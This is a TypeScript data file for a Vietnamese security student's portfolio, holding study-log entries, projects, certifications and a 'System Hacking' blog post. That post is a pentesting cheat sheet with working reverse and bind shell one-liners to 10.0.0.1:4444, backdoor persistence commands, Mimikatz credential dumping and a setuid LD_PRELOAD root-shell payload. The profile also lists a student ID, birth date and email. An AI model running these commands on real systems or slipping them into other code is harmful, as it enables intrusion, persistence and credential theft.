
import { Tag, SkillLevel, Activity, Project, Certification, BlogPost } from './types';

export const PROFILE_INFO = {
  fullName: "Đinh Duy Chính",
  studentId: "2280600311",
  dateOfBirth: "28/08/2004",
  className: "22DTHE5",
  email: "duychinhdinh@gmail.com",
  github: "https://github.com/Chinh288",
  school: "Hutech University",
  field: "An toàn thông tin / An ninh mạng",
  focus: "Bảo mật hệ thống",
  bio: "Sống và làm việc theo tấm gương đạo đức Hồ Chí Minh",
  tools: ["Wireshark", "Suricata", "Wazuh", "Linux", "Nmap", "Burp Suite"]
};

export const MOCK_ACTIVITIES: Activity[] = [
  {
    id: '2025-12-29-system-hacking-deep-dive',
    date: '2025-12-29',
    title: 'System Hacking - Tổng hợp kỹ thuật tấn công và phòng thủ',
    tags: [Tag.READING, Tag.LAB],
    level: SkillLevel.ADVANCED,
    images: ['https://picsum.photos/seed/syshack/1200/800'],
    content: 
    `### Những gì đã làm
Nghiên cứu sâu về System Hacking bao gồm Red Team tactics, các phương thức xác thực Windows (NTLM, Kerberos), kỹ thuật leo thang đặc quyền trên Windows và Linux. Thực hành các kỹ thuật tấn công thực tế như Pass the Hash, Password Spraying, và khai thác lỗi cấu hình hệ thống.

### Những gì đã học

#### 1. Red Team Operations
* **Cyber Attacks**: Sử dụng công nghệ tấn công vào hệ thống máy tính
* **Social Engineering**: Tấn công yếu tố con người
* **Physical Security**: Bẻ khóa, phá khóa vật lý (Black Team)
* **Phương thức tấn công**: OSINT → Truy cập & Thực thi → Leo thang đặc quyền → Lateral Movement → Exfiltration → Domain Takeover

#### 2. Windows Authentication
* **SAM Database**: Lưu trữ Username, UserID, LM Hash, NTLM Hash
* **NTLM Authentication**: Giao thức xác thực cũ hơn, dễ bị tấn công Pass the Hash
* **Kerberos**: Xác thực mạnh hơn với TGT (Ticket Granting Ticket) và TGS (Ticket Granting Service)
* **Attack Techniques**: Password Spraying, Pass the Hash, Responder Attack

#### 3. Privilege Escalation - Windows
* **Unquoted Service Paths**: Khai thác đường dẫn dịch vụ không có ngoặc kép
* **AlwaysInstallElevated**: Lỗi cấu hình Registry cho phép cài đặt MSI với quyền SYSTEM
* **SeBackupPrivilege**: Sao lưu ntds.dit để dump credentials
* **Credential Hunting**: Tìm mật khẩu trong Registry, file config, trình duyệt
* **Tools**: Lazagne, SessionGopher, SharpChrome, lolbas

#### 4. Privilege Escalation - Linux
* **SUID/SGID Binaries**: Tìm và khai thác các file binary có bit đặc biệt
* **Sudo Misconfigurations**: Khai thác cấu hình sudo sai (GTFOBins)
* **Cron Jobs**: Hijack tác vụ định kỳ chạy với quyền root
* **Kernel Exploits**: DirtyCow, PwnKit cho các lỗ hổng kernel
* **LXD Container**: Leo thang đặc quyền thông qua container
* **LD_PRELOAD**: Shared library hijacking

#### 5. Post-Exploitation
* **Reverse Shell vs Bind Shell**: Hiểu sự khác biệt và khi nào sử dụng
* **Persistence**: Backdoor, scheduled tasks, registry keys
* **Credential Dumping**: Mimikatz, /etc/shadow, NTDS.dit
* **Lateral Movement**: Pass-the-Hash, PSExec, Evil-WinRM
* **Tools**: Netcat, Metasploit, pspy, Responder

#### 6. Enumeration & Reconnaissance
* **Network Scanning**: netdiscover, nmap, crackmapexec
* **Web Scanning**: nikto, dirb, burp suite
* **Service Enumeration**: SMB, FTP, SSH, HTTP
* **Information Gathering**: searchsploit, msfconsole

### Bước tiếp theo
Thực hành trên các lab môi trường thực tế (HackTheBox, TryHackMe). Nghiên cứu sâu về Active Directory exploitation và Domain Takeover. Tham gia các scenario Red Team/Blue Team để hiểu cả hai góc độ tấn công và phòng thủ.`
  },
  {
    id: '2025-06-20-hutech-attt-competition',
    date: '2025-06-20',
    title: 'Sinh viên với An toàn thông tin HUTECH 2025',
    tags: [Tag.LAB],
    level: SkillLevel.INTERMEDIATE,
    images: ['/images/SVATTTbth.jpg'],
    content: 
    `### Những gì đã làm
Tham gia cuộc thi "Sinh viên với An toàn thông tin HUTECH 2025" do trường Đại học Công nghệ TP.HCM tổ chức. Thi đấu theo nhóm với các thử thách về Web Security, Cryptography, Network Security và Forensics.

### Những gì đã học
* Làm việc nhóm: Phân chia nhiệm vụ hiệu quả theo thế mạnh từng thành viên
* Quản lý thời gian: Ưu tiên các bài có điểm cao và phù hợp với kỹ năng
* Áp dụng kiến thức: Kết hợp lý thuyết đã học vào giải quyết bài toán thực tế
* Học hỏi từ đối thủ: Trao đổi kỹ thuật và phương pháp tiếp cận sau cuộc thi

### Bước tiếp theo
Rút kinh nghiệm và củng cố các điểm yếu đã phát hiện trong quá trình thi. Chuẩn bị tốt hơn cho các cuộc thi tiếp theo.`
  },
  {
    id: '2025-06-06-ctf-maze-of-shadows',
    date: '2025-06-06',
    title: 'Cuộc thi CTF "The Maze of Shadows" - Câu lạc bộ ATTT HUTECH',
    tags: [Tag.LAB],
    level: SkillLevel.INTERMEDIATE,
    images: ['/images/CTFCLB.jpg'],
    content: 
    `### Những gì đã làm
Tham gia cuộc thi Capture The Flag do Câu lạc bộ An toàn thông tin HUTECH tổ chức. Giải các thử thách về Web Exploitation, Binary Exploitation, Reverse Engineering và Cryptography.

### Những gì đã học
* CTF mindset: Tư duy phân tích đa chiều, không bỏ qua chi tiết nhỏ
* Tool usage: Thành thạo hơn với Burp Suite, IDA Pro, Ghidra, CyberChef
* Flag hunting: Kỹ năng tìm kiếm flag ẩn trong source code, metadata, encoding
* Writeup reading: Học hỏi cách tiếp cận từ các đội khác sau khi kết thúc

### Bước tiếp theo
Luyện tập thường xuyên trên các platform CTF online. Tham gia nhiều giải đấu hơn để tích lũy kinh nghiệm.`
  },
  {
    id: '2025-12-29-system-hacking',
    date: '2025-12-29',
    title: 'System Hacking - Leo thang đặc quyền và Post-Exploitation',
    tags: [Tag.LAB],
    level: SkillLevel.ADVANCED,
    images: ['https://picsum.photos/seed/privesc1/1200/800'],
    content: 
    `### Những gì đã làm
Thực hành kỹ thuật leo thang đặc quyền trên Linux và Windows. Khai thác các dịch vụ cấu hình sai, SUID binaries, và lỗ hổng kernel để đạt quyền root/SYSTEM.

### Những gì đã học
* Leo thang đặc quyền trên Linux:
  - Khai thác SUID/SGID binaries (find / -perm -4000)
  - Lỗi cấu hình sudo (sudo -l, GTFOBins)
  - Cron jobs và PATH hijacking
  - Khai thác lỗ hổng kernel (DirtyCow, PwnKit)
  
* Leo thang đặc quyền trên Windows:
  - Unquoted service paths
  - Weak service permissions (sc qc, accesschk)
  - Token impersonation (SeImpersonatePrivilege)
  - Kỹ thuật bypass UAC
  
* Post-Exploitation:
  - Cơ chế duy trì truy cập (backdoors, scheduled tasks)
  - Trích xuất thông tin đăng nhập (mimikatz, /etc/shadow)
  - Di chuyển ngang (Pass-the-Hash, PSExec)
  - Xóa log và chống điều tra số

### Bước tiếp theo
Nghiên cứu về khai thác Active Directory và leo thang đặc quyền domain. Thực hành trên HackTheBox và TryHackMe machines.`
  },
  {
    id: '2025-12-28-cryptography-basics',
    date: '2025-12-28',
    title: 'Mã hóa hiện đại và ứng dụng Cryptography',
    tags: [Tag.READING, Tag.LAB],
    level: SkillLevel.INTERMEDIATE,
    images: ['https://picsum.photos/seed/crypto1/1200/800'],
    content: 
    `### Những gì đã làm
Nghiên cứu và thực hành các thuật toán mã hóa: AES-256, RSA, SHA-256. Thực hiện bài lab mã hóa end-to-end communication sử dụng thư viện Python cryptography.

### Những gì đã học
* So sánh mã hóa đối xứng và bất đối xứng: Các trường hợp sử dụng và đánh đổi hiệu suất
* Hàm băm: SHA-256, HMAC để đảm bảo tính toàn vẹn dữ liệu
* Chữ ký số: Ký và xác minh RSA
* Quản lý khóa: Thực hành tốt nhất trong môi trường production

### Bước tiếp theo
Tìm hiểu về PKI (Public Key Infrastructure) và quản lý chứng chỉ. Thực hành phá mã hóa yếu trong các thử thách CTF.`
  },
  {
    id: '2025-12-27-digital-forensics',
    date: '2025-12-27',
    title: 'Digital Forensics - Phân tích dấu vết tấn công',
    tags: [Tag.LAB],
    level: SkillLevel.INTERMEDIATE,
    images: ['https://picsum.photos/seed/forensic1/1200/800'],
    content: 
    `### Những gì đã làm
Phân tích memory dump sử dụng Volatility framework. Trích xuất artifacts từ disk image với Autopsy để điều tra sự cố.

### Những gì đã học
* Điều tra bộ nhớ: Phân tích tiến trình, kết nối mạng, phát hiện malware
* Artifacts hệ thống file: Lịch sử trình duyệt, khôi phục file đã xóa, phân tích timeline
* Phân tích log: Windows Event Logs, tương quan Linux syslogs
* Chuỗi bảo quản: Thực hành tốt nhất trong xử lý bằng chứng

### Bước tiếp theo
Học thêm về điều tra thiết bị di động (Android/iOS). Thực hành điều tra mạng với Wireshark và NetworkMiner.`
  },
  {
    id: '2025-12-26-binary-exploitation',
    date: '2025-12-26',
    title: 'PWN - Binary Exploitation và Buffer Overflow',
    tags: [Tag.LAB],
    level: SkillLevel.ADVANCED,
    images: ['https://picsum.photos/seed/pwn1/1200/800'],
    content: 
    `### Những gì đã làm
Thực hành khai thác lỗi buffer overflow trong chương trình C. Sử dụng GDB và pwntools để tạo payload và vượt qua bảo vệ stack.

### Những gì đã học
* Cấu trúc Stack: Thao tác EBP, ESP, return address
* Phát triển Shellcode: Viết và inject mã assembly x86
* Cơ chế bảo vệ: DEP, ASLR, Stack Canaries và kỹ thuật vượt qua
* Return-Oriented Programming (ROP): Xây dựng chuỗi ROP

### Bước tiếp theo
Nghiên cứu khai thác heap và lỗ hổng use-after-free. Tham gia các thử thách CTF PWN để thực hành.`
  },
  {
    id: '2025-12-25-java-security',
    date: '2025-12-25',
    title: 'Java Security - Secure Coding Practices',
    tags: [Tag.READING, Tag.LAB],
    level: SkillLevel.INTERMEDIATE,
    images: ['https://picsum.photos/seed/javasec1/1200/800'],
    content: 
    `### Những gì đã làm
Tìm hiểu về các lỗ hổng phổ biến trong ứng dụng Java: SQL Injection, XXE, tấn công Deserialization. Thực hành lập trình an toàn theo hướng dẫn OWASP.

### Những gì đã học
* Xác thực đầu vào: Làm sạch input người dùng, prepared statements
* Xác thực & Ủy quyền: Triển khai Spring Security
* Deserialization an toàn: Tránh lỗ hổng ObjectInputStream
* Mã hóa trong Java: Framework JCE, sử dụng SecureRandom
* Quét phụ thuộc: Phát hiện thư viện dễ bị tấn công với OWASP Dependency-Check

### Bước tiếp theo
Tìm hiểu sâu về phân tích Java bytecode và cơ chế bảo vệ runtime (SecurityManager).`
  },
  {
    id: '2025-12-24-web-security',
    date: '2025-12-24',
    title: 'Web Application Security Testing',
    tags: [Tag.LAB],
    level: SkillLevel.INTERMEDIATE,
    images: ['https://picsum.photos/seed/websec1/1200/800'],
    content: 
    `### Những gì đã làm
Thực hành tấn công và phòng thủ ứng dụng web. Sử dụng Burp Suite để kiểm tra các lỗ hổng OWASP Top 10 trên DVWA và WebGoat.

### Những gì đã học
* XSS (Stored, Reflected, DOM-based): Khai thác và phòng chống
* CSRF: Xác thực token và SameSite cookies
* SQL Injection: Tấn công Union-based, Blind SQLi, Time-based
* Lỗi xác thực: Quản lý session, lỗ hổng reset mật khẩu
* SSRF và XXE: Truy cập mạng nội bộ và tấn công phân tích XML

### Bước tiếp theo
Học về kiểm tra bảo mật API (REST/GraphQL) và lỗ hổng OAuth 2.0. Thực hành bug bounty hunting.`
  },
  {
    id: '2025-12-20-lap-trinh-mang',
    date: '2025-12-20',
    title: 'Lập Trình Mạng',
    tags: [Tag.READING],
    level: SkillLevel.INTERMEDIATE,
    content: 
    `## PHẦN 1: TỔNG QUAN VÀ KIẾN THỨC NỀN TẢNG

### 1.1 Tổng quan về Lập trình mạng và Môi trường phát triển
* Giới thiệu môn học: Khái niệm, vai trò, ứng dụng thực tế (Web server, Chat, Game, IoT).
* Chuẩn bị môi trường: Java (OOP, Exception), JDK, IntelliJ/Eclipse, Netcat, Telnet.

### 1.2 Kiến thức nền tảng về Mạng máy tính cho lập trình viên
* Mô hình tham chiếu: OSI 7 tầng, TCP/IP 4 tầng. Quá trình Encapsulation/Decapsulation.
* Giao thức cốt lõi: IP, So sánh TCP vs UDP. Khái niệm Port và Socket.
* Kiến trúc: Client-Server, Peer-to-Peer.

## PHẦN 2: QUẢN LÝ DỮ LIỆU VÀ KẾT NỐI

### 2.1 Quản lý luồng vào/ra dữ liệu (Java I/O)
* Luồng Byte (Byte Streams): InputStream, OutputStream.
* Luồng Ký tự (Character Streams): Reader, Writer, Encoding/Decoding.
* Nâng cao: Buffered I/O, Data Streams, Object Serialization.

### 2.2 Quản lý địa chỉ và kết nối mạng trong Java
* Lớp InetAddress: Quản lý IP, DNS Lookup.
* NetworkInterface: Quản lý card mạng, địa chỉ MAC.
* Endpoint: InetSocketAddress.

## PHẦN 3: LẬP TRÌNH SOCKET CƠ BẢN

### 3.1 Lập trình Socket với giao thức TCP (Giao thức tin cậy)
* Cơ chế: Three-way handshake, độ tin cậy.
* Server: ServerSocket, accept(), I/O streams.
* Client: Socket, kết nối IP/Port.
* Vấn đề Blocking: Nghẽn tại accept() và read().

### 3.2 Lập trình Socket với giao thức UDP (Giao thức tốc độ)
* Đặc điểm: Không kết nối, tốc độ cao (Streaming, DNS).
* Lớp cốt lõi: DatagramSocket, DatagramPacket.
* Quy trình: send() và receive().

## PHẦN 4: KỸ THUẬT NÂNG CAO VÀ ỨNG DỤNG PHÂN TÁN

### 4.1 Lập trình đa luồng và Xử lý đồng thời
* Giới hạn server đơn luồng.
* Multithreaded Server: Chiến lược Thread-per-client.
* Quản lý hiệu quả: Thread Pools (ExecutorService).

### 4.2 Các chủ đề nâng cao: Multicast UDP và Java RMI
* Multicast UDP: Unicast/Broadcast/Multicast, MulticastSocket, joinGroup.
* Java RMI: Gọi phương thức từ xa, RMI Registry, Stub/Skeleton.`
  }
];

export const MOCK_BLOGS: BlogPost[] = [
  {
    id: 'system-hacking-complete-guide',
    date: 'December 27, 2024',
    title: 'System Hacking - Tổng hợp kỹ thuật tấn công và phòng thủ',
    tags: ['Security', 'Red Team', 'Privilege Escalation', 'Post-Exploitation'],
    level: 'Advanced',
    content: `## 1. Red Team Operations

### 1.1 OSINT (Open Source Intelligence)
* Thu thập thông tin từ nguồn công khai
* Phân tích dữ liệu mạng xã hội
* Mapping infrastructure và network

### 1.2 Các loại tấn công
* **Cyber Attacks**: Khai thác lỗ hổng phần mềm, DDoS, malware
* **Social Engineering**: Phishing, pretexting, baiting
* **Physical Attacks**: Tailgating, dumpster diving, device theft

### 1.3 Attack Methodology
1. **Reconnaissance**: Thu thập thông tin mục tiêu
2. **Weaponization**: Tạo payload và backdoor
3. **Delivery**: Gửi payload qua email/web/USB
4. **Exploitation**: Khai thác lỗ hổng để thực thi code
5. **Installation**: Cài đặt malware/backdoor
6. **Command & Control**: Thiết lập kênh điều khiển
7. **Actions on Objectives**: Đạt mục tiêu (exfiltrate data, destroy, etc.)

---

## 2. Windows Authentication

### 2.1 SAM Database
* **Location**: C:\\Windows\\System32\\config\\SAM
* Lưu hash mật khẩu local accounts (LM, NTLM)
* Được mã hóa bằng SYSKEY

### 2.2 NTLM Protocol
* **Challenge-Response**: Server gửi challenge, client hash password với challenge
* **Pass the Hash**: Sử dụng hash thay vì plaintext password
* **Tools**: Mimikatz, Responder, Impacket

### 2.3 Kerberos
* **Ticket-based authentication**: TGT (Ticket Granting Ticket) → TGS (Service Ticket)
* **Kerberoasting**: Crack TGS tickets offline để lấy service account password
* **Golden Ticket**: Forge TGT với KRBTGT hash
* **Silver Ticket**: Forge TGS cho service cụ thể

### 2.4 Password Attacks
* **Password Spraying**: Thử 1 password trên nhiều accounts
* **Brute Force**: Thử nhiều passwords trên 1 account
* **Credential Stuffing**: Sử dụng leaked credentials

---

## 3. Windows Privilege Escalation

### 3.1 Unquoted Service Paths
\`\`\`
sc qc vulnerable-service
# Path: C:\\Program Files\\My App\\service.exe
# Windows sẽ thử: C:\\Program.exe, C:\\Program Files\\My.exe
\`\`\`

### 3.2 Registry Exploits
**AlwaysInstallElevated**
\`\`\`
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# Nếu cả 2 đều = 1, tạo malicious MSI để escalate
\`\`\`

### 3.3 Token Manipulation
* **SeBackupPrivilege**: Backup SAM/SYSTEM registry để dump credentials
* **SeRestorePrivilege**: Restore malicious files vào system folders
* **SeImpersonatePrivilege**: Impersonate SYSTEM token (JuicyPotato, PrintSpoofer)

### 3.4 Credential Hunting
\`\`\`powershell
# Tìm passwords trong files
findstr /si password *.xml *.ini *.txt *.config

# PowerShell history
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

# Cached credentials
cmdkey /list
runas /savecred /user:admin cmd.exe
\`\`\`

### 3.5 Tools
* **WinPEAS**: Automated enumeration
* **PowerUp**: PowerShell privilege escalation
* **Seatbelt**: C# security enumeration
* **SharpUp**: C# port của PowerUp

---

## 4. Linux Privilege Escalation

### 4.1 SUID/SGID Binaries
\`\`\`bash
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# GTFOBins: Exploit SUID binaries
/usr/bin/find . -exec /bin/sh -p \\; -quit
\`\`\`

### 4.2 Sudo Misconfigurations
\`\`\`bash
sudo -l  # Check sudo permissions

# LD_PRELOAD exploit
sudo LD_PRELOAD=/tmp/evil.so find
\`\`\`

### 4.3 Cron Jobs
\`\`\`bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Writable cron scripts
ls -la /var/spool/cron/crontabs
\`\`\`

### 4.4 Kernel Exploits
\`\`\`bash
uname -a
searchsploit "Linux Kernel"

# DirtyCOW (CVE-2016-5195)
# PwnKit (CVE-2021-4034)
\`\`\`

### 4.5 Special Exploits
**LXD/LXC Group**
\`\`\`bash
lxc init alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
\`\`\`

**LD_PRELOAD Escalation**
\`\`\`c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
\`\`\`

---

## 5. Post-Exploitation

### 5.1 Reverse Shells
\`\`\`bash
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
\`\`\`

### 5.2 Bind Shells
\`\`\`bash
nc -lvp 4444 -e /bin/bash  # Linux
nc -lvp 4444 -e cmd.exe    # Windows
\`\`\`

### 5.3 Persistence Mechanisms
**Windows**
\`\`\`
# Registry Run keys
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"

# Scheduled Tasks
schtasks /create /tn "Updater" /tr "C:\\backdoor.exe" /sc onlogon

# Services
sc create MyService binPath= "C:\\backdoor.exe" start= auto
\`\`\`

**Linux**
\`\`\`bash
# Cron jobs
echo "* * * * * /tmp/backdoor" | crontab -

# SSH keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# .bashrc
echo "/tmp/backdoor &" >> ~/.bashrc
\`\`\`

### 5.4 Credential Dumping
**Mimikatz (Windows)**
\`\`\`
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
\`\`\`

**Linux**
\`\`\`bash
# /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Memory dumps
grep -a "password" /proc/*/environ
\`\`\`

### 5.5 Lateral Movement
* **PSExec**: Execute commands on remote Windows systems
* **WMI**: Windows Management Instrumentation
* **WinRM**: Windows Remote Management
* **SSH**: Secure Shell for Linux/Unix

### 5.6 Tools
* **Metasploit**: Framework tấn công và post-exploitation
* **Empire/Covenant**: C2 frameworks
* **BloodHound**: Active Directory mapping
* **CrackMapExec**: Network pentesting tool

---

## 6. Enumeration & Reconnaissance

### 6.1 Network Scanning
\`\`\`bash
# Nmap
nmap -sC -sV -oA scan 10.0.0.0/24
nmap -p- --min-rate 1000 10.0.0.1

# Masscan
masscan -p1-65535 10.0.0.0/24 --rate=1000
\`\`\`

### 6.2 Web Application Scanning
\`\`\`bash
# Nikto
nikto -h http://target.com

# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Wfuzz
wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://target.com/FUZZ
\`\`\`

### 6.3 Service Enumeration
* **SMB**: enum4linux, smbclient, smbmap
* **LDAP**: ldapsearch, windapsearch
* **SNMP**: snmpwalk, onesixtyone
* **DNS**: dig, nslookup, dnsenum

### 6.4 Information Gathering
* **Whois**: Domain registration info
* **Shodan**: Internet-connected device search
* **theHarvester**: Email/subdomain harvesting
* **Recon-ng**: Reconnaissance framework`,
    images: []
  }
];

export const MOCK_PROJECTS: Project[] = [
  {
    id: 'steganography-detection',
    title: 'Phát hiện tin ẩn trong ảnh bằng CNN',
    description: 'Xây dựng hệ thống web phát hiện steganography sử dụng Deep Learning.',
    technologies: ['Python', 'TensorFlow', 'CNN', 'Flask', 'React'],
    content: `Phát triển mô hình CNN để phát hiện thông tin ẩn trong ảnh (steganography). Xây dựng website cho phép người dùng kiểm tra ảnh trước khi tải về, cảnh báo nếu phát hiện dữ liệu ẩn đáng ngờ. Hệ thống sử dụng transfer learning và đạt độ chính xác 92% trên tập test.`
  },
  {
    id: 'integer-overflow-analysis',
    title: 'Phân tích và khai thác lỗ hổng Integer Overflow',
    description: 'Nghiên cứu và demo các kỹ thuật khai thác lỗ hổng tràn số nguyên.',
    technologies: ['C', 'GDB', 'Python', 'Assembly'],
    content: `Phân tích chi tiết cơ chế lỗ hổng integer overflow trong các ứng dụng C/C++. Xây dựng các proof-of-concept để demo cách khai thác: overflow trong phép nhân/cộng, bypass kiểm tra kích thước buffer, và leo thang đặc quyền. Tạo tool tự động phát hiện các đoạn code dễ bị tấn công integer overflow.`
  },
  {
    id: 'sql-injection-research',
    title: 'Nghiên cứu và phân tích lỗ hổng SQL Injection',
    description: 'Phân tích sâu các kỹ thuật SQL Injection và phương pháp phòng chống.',
    technologies: ['SQL', 'Python', 'Burp Suite', 'SQLMap'],
    content: `Nghiên cứu toàn diện về SQL Injection: Union-based, Boolean-based blind, Time-based blind, và Error-based SQLi. Phân tích bypasses cho WAF, filter evasion techniques. Xây dựng lab môi trường vulnerable để thực hành và demo các kỹ thuật tấn công. Đề xuất best practices cho secure coding và sử dụng prepared statements.`
  },
  {
    id: 'web-vulnerability-exploitation',
    title: 'Khai thác lỗ hổng bảo mật trên ứng dụng Web',
    description: 'Pentesting và khai thác lỗ hổng trên các trang web thực tế.',
    technologies: ['Burp Suite', 'OWASP ZAP', 'Metasploit', 'Python'],
    content: `Thực hiện penetration testing trên các ứng dụng web vulnerable (DVWA, WebGoat, bWAPP). Khai thác đa dạng lỗ hổng: XSS, CSRF, SSRF, XXE, File Upload, Path Traversal, Command Injection. Viết exploit scripts và tự động hóa quá trình khai thác. Lập báo cáo chi tiết về các lỗ hổng phát hiện và đề xuất giải pháp khắc phục.`
  }
];

export const MOCK_CERTIFICATIONS: Certification[] = [
  {
    id: 'hutech-is-2025',
    title: 'Giải Khuyến Khích - Sinh viên với An toàn thông tin HUTECH 2025',
    images: ['/images/SVATTT.jpg'],
    issuer: 'Trường Đại học Công nghệ TP.HCM (HUTECH)',
    date: '20/06/2025',
    content: 'Đạt giải Khuyến khích trong cuộc thi chuyên môn về An toàn thông tin cấp trường dành cho nhóm sinh viên.'
  },
  {
    id: 'maze-of-shadows-ctf',
    title: 'Giải Khuyến Khích - Cuộc thi CTF "The Maze of Shadows"',
    images: ['/images/ctf-maze.jpg'],
    issuer: 'Câu lạc bộ An toàn thông tin HUTECH',
    date: '06/06/2025',
    content: 'Chứng nhận thành tích giải Khuyến khích trong giải đấu Capture The Flag nội bộ.'
  },
  {
    id: 'cisco-intro-cyber',
    title: 'Introduction to Cybersecurity',
    images: ['/images/Seccyber.jpg'],
    issuer: 'Cisco Networking Academy',
    date: '29/11/2024',
    content: 'Chứng nhận hoàn thành khóa học nền tảng về an ninh mạng, bảo vệ dữ liệu và nguyên tắc bảo mật.'
  },
  {
    id: 'cisco-js-essentials',
    title: 'JavaScript Essentials 1',
    images: ['/images/java1.jpg'],
    issuer: 'Cisco Networking Academy',
    date: '01/12/2025',
    content: 'Nắm vững kiến thức lập trình JavaScript cơ bản phục vụ cho phát triển ứng dụng và tự động hoá.'
  },
  {
    id: 'cisco-networking-basics',
    title: 'Networking Basics',
    images: ['/images/NetworkBasic.jpg'],
    issuer: 'Cisco Networking Academy',
    date: '20/11/2025',
    content: 'Hiểu rõ các nguyên lý mạng, mô hình OSI và cấu hình thiết bị mạng Cisco.'
  },
   {
    id: 'cisco-js-essentials',
    title: 'JavaScript Essentials 2',
    images: ['/images/Jvaess2.jpg'],
    issuer: 'Cisco Networking Academy',
    date: '20/12/2025',
    content: 'Nắm vững kiến thức lập trình JavaScript cơ bản phục vụ cho phát triển ứng dụng và tự động hoá.'
  }
];
